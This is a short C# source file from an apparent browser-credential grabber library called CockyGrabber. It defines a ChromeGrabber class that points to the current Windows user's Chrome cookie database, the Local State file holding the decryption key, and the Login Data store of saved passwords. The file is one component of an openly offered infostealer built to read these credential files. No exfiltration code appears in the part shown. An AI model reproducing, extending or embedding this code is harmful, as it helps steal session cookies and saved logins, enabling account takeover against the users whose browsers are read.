using System;

namespace CockyGrabber.Grabbers
{
    public class ChromeGrabber : ChromiumGrabber
    {
        public override string ChromiumBrowserCookiePath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
            }
        }
        public override string ChromiumBrowserLocalStatePath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
            }
        }
        public override string ChromiumBrowserLoginDataPath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
            }
        }
    }
}